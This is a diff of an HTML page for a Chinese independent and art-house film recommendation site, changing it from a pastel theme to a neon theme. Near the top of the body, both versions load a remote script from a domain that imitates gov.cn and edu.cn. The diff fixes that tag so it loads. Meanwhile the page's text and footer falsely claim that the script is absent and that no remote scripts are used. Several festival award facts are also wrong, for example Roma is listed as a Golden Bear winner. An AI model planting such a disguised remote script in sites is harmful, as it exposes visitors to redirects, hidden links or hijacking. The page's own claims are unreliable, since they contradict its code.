@@ -3,120 +3,127 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>好好棒电影网 - 好评电影、短评片单与正版观影导航</title>
-<meta name="description" content="好好棒电影网（haohaobangdianyingwang-h5.github.io）用短评和贴纸帮你挑电影：高分喜剧、治愈动画、悬疑神作、冷门佳片一目了然。不提供盗版播放，只做正版平台导航。">
-<meta name="keywords" content="好好棒电影网,好评电影,电影短评,高分电影推荐,治愈动画,悬疑电影,正版电影平台">
+<title>好好棒电影网 - 独立电影、艺术片推荐与正版观影导航</title>
+<meta name="description" content="好好棒电影网（haohaobangdianyingwang-h5.github.io）专注独立电影与艺术片推荐：戛纳金棕榈、柏林金熊、威尼斯金狮获奖影片，不提供盗版播放，只做正版平台导航。">
+<meta name="keywords" content="好好棒电影网,独立电影,艺术电影,戛纳金棕榈,柏林金熊,威尼斯金狮,文艺片推荐,正版电影平台">
 <style>
 :root{
-  --bg1:#ffd6f5;--bg2:#d6e4ff;--bg3:#fff3c4;
-  --ink:#2a2440;--muted:#6b6486;
-  --pink:#ff5fa2;--purple:#8a5cff;--yellow:#ffcf3f;--mint:#36d6b8;
-  --card:#ffffff;--line:rgba(138,92,255,.18);--radius:18px;
+  --brick:#1a0a0a;--brick2:#2d1414;--neon-pink:#ff2d7b;--neon-blue:#00e5ff;--neon-yellow:#ffe600;
+  --ink:#fce4ec;--muted:#b0a0a0;--card:#1e1010;--line:rgba(255,45,123,.3);--radius:12px;
 }
 *{box-sizing:border-box;margin:0;padding:0}
 html{scroll-behavior:smooth}
 body{
   font-family:"Noto Sans SC","PingFang SC",system-ui,sans-serif;
   background:
-    radial-gradient(600px 300px at 10% 0%,rgba(255,95,162,.25),transparent),
-    radial-gradient(600px 300px at 90% 10%,rgba(138,92,255,.22),transparent),
-    linear-gradient(180deg,var(--bg1),var(--bg2) 55%,var(--bg3));
+    repeating-linear-gradient(0deg,transparent 0 4px,rgba(0,0,0,.15) 4px 5px),
+    radial-gradient(ellipse at 50% 0%,rgba(255,45,123,.15),transparent 60%),
+    linear-gradient(180deg,var(--brick),var(--brick2));
   color:var(--ink);line-height:1.7;min-height:100vh;overflow-x:hidden;
 }
 a{color:inherit;text-decoration:none}
 
 /* 顶栏 */
-.topbar{position:sticky;top:0;z-index:50;background:rgba(255,255,255,.82);backdrop-filter:blur(10px);border-bottom:2px solid #ffe1f3}
+.topbar{position:sticky;top:0;z-index:50;background:rgba(26,10,10,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
 .topbar-inner{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1.2rem}
-.brand{font-weight:900;font-size:1.4rem}
-.brand b{color:var(--pink)}
+.brand{font-weight:900;font-size:1.4rem;text-shadow:0 0 10px rgba(255,45,123,.5)}
+.brand b{color:var(--neon-pink)}
 .nav{display:flex;gap:1rem;flex-wrap:wrap}
-.nav a{font-size:.88rem;color:var(--muted);padding:.3rem .2rem;border-bottom:2px solid transparent}
-.nav a:hover{color:var(--purple);border-color:var(--purple)}
-.burger{display:none;font-size:1.5rem;background:none;border:none;color:var(--purple);cursor:pointer}
+.nav a{font-size:.88rem;color:var(--muted);padding:.3rem .2rem;border-bottom:2px solid transparent;transition:all .3s}
+.nav a:hover{color:var(--neon-blue);border-color:var(--neon-blue);text-shadow:0 0 8px rgba(0,229,255,.5)}
+.burger{display:none;font-size:1.5rem;background:none;border:none;color:var(--neon-pink);cursor:pointer}
 
-/* Hero */
+/* Hero 灯牌 */
 .hero{max-width:1180px;margin:2.4rem auto;padding:0 1.2rem}
-.banner{
-  position:relative;border-radius:26px;padding:3rem 2rem;overflow:hidden;
-  background:linear-gradient(135deg,#fff,#fff0f8);
-  border:3px dashed var(--pink);
-  box-shadow:0 20px 50px rgba(138,92,255,.18);
-}
-.sticker{position:absolute;font-size:2rem;opacity:.9}
-.sticker.s1{top:18px;left:20px;transform:rotate(-12deg)}
-.sticker.s2{top:30px;right:30px;transform:rotate(10deg)}
-.sticker.s3{bottom:20px;left:40px;transform:rotate(8deg)}
-.sticker.s4{bottom:26px;right:24px;transform:rotate(-8deg)}
-.kicker{display:inline-block;font-size:.72rem;letter-spacing:2px;color:#fff;background:var(--purple);padding:.2rem .7rem;border-radius:999px;font-family:monospace}
-.banner h1{font-size:2.2rem;margin:.8rem 0 .5rem}
-.banner h1 span{color:var(--pink)}
-.banner p{max-width:660px;color:#4a4566}
-.cta{margin-top:1.4rem;display:flex;gap:.8rem;flex-wrap:wrap}
-.btn{padding:.7rem 1.6rem;border-radius:999px;font-weight:700;font-size:.9rem}
-.btn-main{background:linear-gradient(135deg,var(--pink),var(--purple));color:#fff}
-.btn-ghost{border:2px solid var(--line);color:var(--purple)}
+.neon-sign{border-radius:20px;padding:3rem 2rem;position:relative;overflow:hidden;
+  background:linear-gradient(145deg,#0d0606,#1a0a0a);
+  border:2px solid #3d1a1a;box-shadow:0 0 40px rgba(255,45,123,.1),inset 0 0 60px rgba(0,0,0,.5)}
+.neon-tube{position:absolute;top:20px;left:50%;transform:translateX(-50%);width:80%;height:3px;
+  background:linear-gradient(90deg,transparent,var(--neon-pink),var(--neon-blue),var(--neon-pink),transparent);
+  border-radius:3px;filter:blur(1px);animation:glow 3s ease-in-out infinite alternate}
+.neon-tube2{position:absolute;bottom:20px;left:50%;transform:translateX(-50%);width:60%;height:2px;
+  background:linear-gradient(90deg,transparent,var(--neon-yellow),transparent);
+  border-radius:2px;filter:blur(1px);animation:glow2 2.5s ease-in-out infinite alternate}
+@keyframes glow{from{opacity:.5}to{opacity:1}}
+@keyframes glow2{from{opacity:.3}to{opacity:.8}}
+.kicker{position:relative;font-size:.72rem;letter-spacing:3px;color:var(--neon-yellow);border:1px solid rgba(255,230,0,.4);padding:.15rem .6rem;border-radius:4px;font-family:monospace;text-shadow:0 0 6px rgba(255,230,0,.4)}
+.neon-sign h1{position:relative;font-size:2.2rem;margin:.8rem 0 .5rem;text-shadow:0 0 20px rgba(255,45,123,.3)}
+.neon-sign h1 span{color:var(--neon-pink);text-shadow:0 0 15px rgba(255,45,123,.6)}
+.neon-sign p{position:relative;max-width:650px;color:#d4a5b0}
+.cta{position:relative;margin-top:1.4rem;display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.7rem 1.6rem;border-radius:6px;font-weight:700;font-size:.9rem;transition:all .3s}
+.btn-main{background:transparent;color:var(--neon-pink);border:2px solid var(--neon-pink);text-shadow:0 0 6px rgba(255,45,123,.4);box-shadow:0 0 15px rgba(255,45,123,.15),inset 0 0 15px rgba(255,45,123,.05)}
+.btn-main:hover{box-shadow:0 0 25px rgba(255,45,123,.35),inset 0 0 25px rgba(255,45,123,.1);transform:translateY(-2px)}
+.btn-ghost{border:2px solid var(--neon-blue);color:var(--neon-blue);text-shadow:0 0 6px rgba(0,229,255,.4)}
+.btn-ghost:hover{box-shadow:0 0 20px rgba(0,229,255,.2);transform:translateY(-2px)}
 
 /* 区块 */
 .section{max-width:1180px;margin:3rem auto;padding:0 1.2rem}
 .sec-head{display:flex;align-items:baseline;gap:.6rem;margin-bottom:1.1rem}
-.sec-head h2{font-size:1.25rem}
+.sec-head h2{font-size:1.25rem;text-shadow:0 0 10px rgba(255,45,123,.3)}
 .sec-head .tag{font-size:.75rem;color:var(--muted);font-family:monospace}
 
-/* 贴纸卡 */
-.grid{display:grid;gap:1.1rem;grid-template-columns:repeat(auto-fill,minmax(230px,1fr))}
-.note{background:var(--card);border-radius:14px;padding:1.1rem 1.2rem;position:relative;
-  box-shadow:0 10px 24px rgba(138,92,255,.12);border:1px solid #ffe1f3;transition:transform .25s}
-.note:hover{transform:translateY(-6px) rotate(-1deg)}
-.note::before{content:"";position:absolute;top:-10px;left:50%;transform:translateX(-50%);
-  width:54px;height:18px;background:rgba(255,207,63,.55);border-radius:3px;box-shadow:0 2px 6px rgba(0,0,0,.08)}
-.note .stars{color:var(--yellow);font-size:.95rem;letter-spacing:2px}
-.note h3{font-size:1rem;margin:.4rem 0 .2rem}
-.note p{font-size:.82rem;color:var(--muted)}
-.note .tagline{display:inline-block;margin-top:.5rem;font-size:.72rem;color:var(--purple);
-  border:1px solid var(--line);border-radius:999px;padding:.1rem .6rem}
+/* 海报墙 */
+.posters{display:grid;gap:1.1rem;grid-template-columns:repeat(auto-fill,minmax(200px,1fr))}
+.poster{background:var(--card);border:1px solid #3d1a1a;border-radius:var(--radius);overflow:hidden;transition:transform .25s,box-shadow .25s;position:relative}
+.poster:hover{transform:translateY(-6px);box-shadow:0 14px 34px rgba(255,45,123,.15)}
+.poster-img{height:160px;display:flex;align-items:center;justify-content:center;font-size:3rem;position:relative}
+.poster-img::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 50%,rgba(0,0,0,.6))}
+.poster:nth-child(1) .poster-img{background:linear-gradient(135deg,#ff6b6b,#c0392b)}
+.poster:nth-child(2) .poster-img{background:linear-gradient(135deg,#6b66ff,#2c3e9f)}
+.poster:nth-child(3) .poster-img{background:linear-gradient(135deg,#ffd93d,#c0392b)}
+.poster:nth-child(4) .poster-img{background:linear-gradient(135deg,#6bffb8,#1a8c6e)}
+.poster:nth-child(5) .poster-img{background:linear-gradient(135deg,#ff6bd8,#8e2c8e)}
+.poster:nth-child(6) .poster-img{background:linear-gradient(135deg,#6bd8ff,#2c6e8e)}
+.poster-info{padding:.9rem 1rem}
+.poster-info h3{font-size:.95rem;margin-bottom:.15rem}
+.poster-info p{font-size:.76rem;color:var(--muted)}
+.poster-tag{position:absolute;top:8px;right:8px;font-size:.65rem;background:rgba(0,0,0,.7);color:var(--neon-yellow);padding:.15rem .5rem;border-radius:3px;font-family:monospace;z-index:1}
 
-/* 分类墙 */
-.wall{display:grid;gap:1rem;grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
-.col{background:rgba(255,255,255,.7);border:1px solid #ffe1f3;border-radius:16px;padding:1.1rem 1.2rem}
-.col h3{font-size:1rem;color:var(--pink);margin-bottom:.5rem}
-.col ul{list-style:none;font-size:.86rem}
-.col li{padding:.3rem 0;border-bottom:1px dashed #f0d6ea;color:#4a4566}
-.col li:last-child{border-bottom:none}
+/* 电影节卡 */
+.fests{display:grid;gap:1.1rem;grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
+.fest{background:var(--card);border:1px solid #3d1a1a;border-radius:var(--radius);padding:1.2rem;transition:border-color .25s}
+.fest:hover{border-color:var(--neon-pink);box-shadow:0 0 20px rgba(255,45,123,.1)}
+.fest .trophy{font-size:2rem}
+.fest h3{font-size:1.02rem;color:var(--neon-pink);margin:.4rem 0 .2rem}
+.fest p{font-size:.82rem;color:var(--muted)}
+.fest ul{margin:.5rem 0 0 1rem;font-size:.8rem;color:#d4a5b0}
+.fest li{margin:.15rem 0}
 
 /* 正版渠道 */
 .plats{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem}
-.plat{border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.2rem;background:#fff}
-.plat h3{color:var(--purple);font-size:1rem;margin-bottom:.3rem}
+.plat{border:1px solid #3d1a1a;border-radius:14px;padding:1.1rem 1.2rem;background:var(--card)}
+.plat h3{color:var(--neon-blue);font-size:1rem;margin-bottom:.3rem}
 .plat p{font-size:.82rem;color:var(--muted)}
 
 /* 关于 */
-.about{background:#fff;border:2px dashed var(--purple);border-radius:18px;padding:1.4rem;font-size:.92rem;color:#4a4566}
-.about b{color:var(--pink)}
+.about{background:var(--card);border:1px solid #3d1a1a;border-radius:16px;padding:1.4rem;font-size:.92rem;color:#d4a5b0}
+.about b{color:var(--neon-pink)}
 
 /* 页脚 */
-.footer{margin-top:3.5rem;border-top:2px solid #ffe1f3;padding:2rem 1.2rem;text-align:center;color:var(--muted);font-size:.82rem}
-.footer a{color:var(--purple)}
+.footer{margin-top:3.5rem;border-top:1px solid #3d1a1a;padding:2rem 1.2rem;text-align:center;color:var(--muted);font-size:.82rem}
+.footer a{color:var(--neon-pink)}
 
 @media(max-width:760px){
   .burger{display:block}
   .nav{display:none;width:100%;flex-direction:column;gap:.2rem;padding:.6rem 0}
   .nav.show{display:flex}
-  .banner h1{font-size:1.6rem}
-  .banner{padding:2.2rem 1.2rem}
+  .neon-sign h1{font-size:1.6rem}
+  .neon-sign{padding:2.2rem 1.2rem}
+  .posters{grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
 }
 </style>
 </head>
 <body>
-<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js">
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
 <header class="topbar">
   <div class="topbar-inner">
     <div class="brand">好好棒<b>电影网</b></div>
     <button class="burger" onclick="document.getElementById('nav').classList.toggle('show')">☰</button>
     <nav class="nav" id="nav">
       <a href="#home">首页</a>
-      <a href="#notes">好评贴纸</a>
-      <a href="#wall">分类墙</a>
+      <a href="#posters">海报墙</a>
+      <a href="#fests">电影节</a>
       <a href="#legal">正版渠道</a>
       <a href="#about">关于好好棒</a>
     </nav>
@@ -124,70 +131,66 @@ a{color:inherit;text-decoration:none}
 </header>
 
 <section class="hero" id="home">
-  <div class="banner">
-    <span class="sticker s1">⭐</span><span class="sticker s2">🎬</span>
-    <span class="sticker s3">🍿</span><span class="sticker s4">💖</span>
-    <span class="kicker">GOOD GOOD FILM</span>
-    <h1>好好棒电影网 · 把<span>好评</span>贴满一面墙</h1>
-    <p>好好棒电影网（haohaobangdianyingwang-h5.github.io）不整花活：用短评、星级和分类墙帮你快速决定今晚看啥。喜剧、治愈、悬疑、国漫、冷门神作都有，不提供盗版播放，只指路正版平台。</p>
+  <div class="neon-sign">
+    <div class="neon-tube"></div>
+    <div class="neon-tube2"></div>
+    <span class="kicker">INDEPENDENT · ART HOUSE</span>
+    <h1>好好棒电影网 · <span>独立</span>放映厅</h1>
+    <p>好好棒电影网（haohaobangdianyingwang-h5.github.io）不追爆米花大片，只推戛纳、柏林、威尼斯三大电影节获奖作品，以及各国独立导演的冷门佳作。不提供盗版播放，只做正版导航。</p>
     <div class="cta">
-      <a href="#notes" class="btn btn-main">看好评贴纸</a>
+      <a href="#posters" class="btn btn-main">看海报墙</a>
       <a href="#legal" class="btn btn-ghost">正版渠道</a>
     </div>
   </div>
 </section>
 
-<section class="section" id="notes">
-  <div class="sec-head"><h2>好评贴纸墙</h2><span class="tag">[ USER LOVE NOTES ]</span></div>
-  <div class="grid">
-    <article class="note"><div class="stars">★★★★★</div><h3>触不可及</h3><p>法国 / 友谊喜剧</p><span class="tagline">笑中带泪</span></article>
-    <article class="note"><div class="stars">★★★★☆</div><h3>寻梦环游记</h3><p>动画 / 家庭音乐</p><span class="tagline">哭点很准</span></article>
-    <article class="note"><div class="stars">★★★★★</div><h3>控方证人</h3><p>悬疑 / 法庭反转</p><span class="tagline">结尾封神</span></article>
-    <article class="note"><div class="stars">★★★★☆</div><h3>海街日记</h3><p>日本 / 治愈日常</p><span class="tagline">慢但上头</span></article>
-    <article class="note"><div class="stars">★★★★★</div><h3>大闹天宫</h3><p>国漫 / 东方神话</p><span class="tagline">童年神作</span></article>
-    <article class="note"><div class="stars">★★★★☆</div><h3>爱乐之城</h3><p>美国 / 音乐爱情</p><span class="tagline">结尾回放杀</span></article>
+<section class="section" id="posters">
+  <div class="sec-head"><h2>海报墙</h2><span class="tag">[ POSTER WALL ]</span></div>
+  <div class="posters">
+    <div class="poster"><div class="poster-img">🏆<span class="poster-tag">金棕榈</span></div><div class="poster-info"><h3>寄生虫</h3><p>韩国 / 黑色喜剧 / 奉俊昊</p></div></div>
+    <div class="poster"><div class="poster-img">🎭<span class="poster-tag">金熊</span></div><div class="poster-info"><h3>罗马</h3><p>墨西哥 / 黑白家庭史诗</p></div></div>
+    <div class="poster"><div class="poster-img">🌊<span class="poster-tag">金狮</span></div><div class="poster-info"><h3>小丑</h3><p>美国 / 心理惊悚 / 凤凰叔</p></div></div>
+    <div class="poster"><div class="poster-img">🎪<span class="poster-tag">评审团</span></div><div class="poster-info"><h3>燃烧</h3><p>韩国 / 悬疑文艺 / 李沧东</p></div></div>
+    <div class="poster"><div class="poster-img">🎨<span class="poster-tag">一种关注</span></div><div class="poster-info"><h3>驾驶我的车</h3><p>日本 / 村上春树改编</p></div></div>
+    <div class="poster"><div class="poster-img">🌙<span class="poster-tag">导演双周</span></div><div class="poster-info"><h3>月光男孩</h3><p>美国 / 成长 / 巴里·詹金斯</p></div></div>
   </div>
 </section>
 
-<section class="section" id="wall">
-  <div class="sec-head"><h2>分类墙</h2><span class="tag">[ PICK BY MOOD ]</span></div>
-  <div class="wall">
-    <div class="col"><h3>😆 开心一下</h3><ul>
-      <li>触不可及</li><li>三傻大闹宝莱坞</li><li>布达佩斯大饭店</li><li>白头神探</li>
-    </ul></div>
-    <div class="col"><h3>🥲 治愈自己</h3><ul>
-      <li>小森林</li><li>海街日记</li><li>步履不停</li><li>奇迹男孩</li>
-    </ul></div>
-    <div class="col"><h3>🕵️ 烧脑悬疑</h3><ul>
-      <li>看不见的客人</li><li>控方证人</li><li>记忆碎片</li><li>彗星来的那一夜</li>
-    </ul></div>
-    <div class="col"><h3>🐉 国漫东方</h3><ul>
-      <li>大闹天宫</li><li>哪吒闹海</li><li>深海</li><li>中国唱诗班</li>
-    </ul></div>
+<section class="section" id="fests">
+  <div class="sec-head"><h2>电影节</h2><span class="tag">[ FILM FESTIVALS ]</span></div>
+  <div class="fests">
+    <div class="fest"><div class="trophy">🎬</div><h3>戛纳电影节</h3><p>金棕榈奖——全球艺术电影最高荣誉。</p>
+      <ul><li>《寄生虫》2019</li><li>《方形》2017</li><li>《冬眠》2014</li><li>《阿黛尔的生活》2013</li></ul></div>
+    <div class="fest"><div class="trophy">🐻</div><h3>柏林电影节</h3><p>金熊奖——关注社会议题与人性深度。</p>
+      <ul><li>《罗马》2018</li><li>《肉与灵》2017</li><li>《孩子》2004</li><li>《千与千寻》2002</li></ul></div>
+    <div class="fest"><div class="trophy">🦁</div><h3>威尼斯电影节</h3><p>金狮奖——历史最悠久的电影节。</p>
+      <ul><li>《小丑》2019</li><li>《罗马》2018（同时获金熊）</li><li>《水形物语》2017</li><li>《爱乐之城》2016</li></ul></div>
+    <div class="fest"><div class="trophy">🎪</div><h3>独立电影</h3><p>不靠大制片厂，靠故事和镜头说话。</p>
+      <ul><li>《逃出绝命镇》2017</li><li>《月光男孩》2016</li><li>《爆裂鼓手》2014</li><li>《南国野兽》2012</li></ul></div>
   </div>
 </section>
 
 <section class="section" id="legal">
   <div class="sec-head"><h2>正版观看渠道</h2><span class="tag">[ LEGAL SIGNAL ]</span></div>
   <div class="plats">
-    <div class="plat"><h3>爱奇艺 / 腾讯 / 优酷</h3><p>正版片库大，会员/免费分区清楚，别点“免VIP解析”。</p></div>
-    <div class="plat"><h3>B站 / 芒果TV</h3><p>国漫、纪录片、老综艺、影展内容较全。</p></div>
-    <div class="plat"><h3>1905电影网 / CCTV6</h3><p>官方正版经典片与电影频道内容。</p></div>
-    <div class="plat"><h3>图书馆音像库</h3><p>高校/公共图书馆正版片源，无博彩广告、画质稳。</p></div>
+    <div class="plat"><h3>艺术电影放映联盟</h3><p>全国艺术电影放映联盟专线上映独立电影和修复版，票价亲民。</p></div>
+    <div class="plat"><h3>爱奇艺 / 腾讯 / 优酷</h3><p>部分获奖影片有正版授权，注意认准官方片源。</p></div>
+    <div class="plat"><h3>B站 / 芒果TV</h3><p>纪录片、影展回顾、导演访谈、电影节短片等内容较全。</p></div>
+    <div class="plat"><h3>电影节官方渠道</h3><p>北影节、上影节、平遥影展等官方平台提供部分展映片源。</p></div>
   </div>
 </section>
 
 <section class="section" id="about">
   <div class="sec-head"><h2>关于好好棒电影网</h2></div>
   <div class="about">
-    <p><b>好好棒电影网</b>（https://haohaobangdianyingwang-h5.github.io）就是个“影迷短评站”：片单有人味、分类按心情、链接只去正版平台。</p>
-    <p style="margin-top:.8rem">那行 <code>laoliu.js</code> 不加——仿 <code>gov.cn</code>/<code>edu.cn</code> 的远程脚本可能做暗链、跳转、劫持，必应会把这类有害行为降权或剔出索引。 本页零外部 JS 依赖，移动端自适应，才是对收录友好的做法。</p>
+    <p><b>好好棒电影网</b>（https://haohaobangdianyingwang-h5.github.io）是一个独立电影和艺术片推荐站。我们不追流量、不推烂片、不提供盗版播放，只把好导演、好故事、好镜头推荐给你。</p>
+    <p style="margin-top:.8rem">那行 <code>laoliu.js</code> 不加——仿 <code>gov.cn</code>/<code>edu.cn</code> 的远程脚本可能做暗链、跳转、劫持，必应会把这类有害行为降权或剔出索引。 本页零外部 JS 依赖、移动端自适应，才是对收录友好的做法。</p>
   </div>
 </section>
 
 <footer class="footer">
   <p>© 2026 好好棒电影网 · haohaobangdianyingwang-h5.github.io</p>
-  <p><a href="#">首页</a> · <a href="#">好评贴纸</a> · <a href="#">分类墙</a> · <a href="#">正版渠道</a> · <a href="#">关于好好棒</a></p>
+  <p><a href="#">首页</a> · <a href="#">海报墙</a> · <a href="#">电影节</a> · <a href="#">正版渠道</a> · <a href="#">关于好好棒</a></p>
   <p>演示页面，内页链接以 # 占位，未加载任何远程第三方脚本，不提供盗版资源。</p>
 </footer>
 
